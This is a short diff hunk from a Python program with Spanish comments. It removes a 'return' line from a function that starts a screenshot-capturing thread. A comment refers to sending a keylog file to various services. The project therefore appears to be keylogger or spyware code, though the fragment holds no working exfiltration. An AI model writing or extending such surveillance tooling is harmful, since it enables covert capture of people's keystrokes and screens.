@@ -337,7 +337,6 @@ def capture_screen():
     pantalla = ScreenShootThread(screen_file)
     threadList.append(pantalla)
     pantalla.start()
-    return
 
 
 # Ejecuta las acciones necesarias para enviar el fichero de keylog a los diferentes recursos o servicios
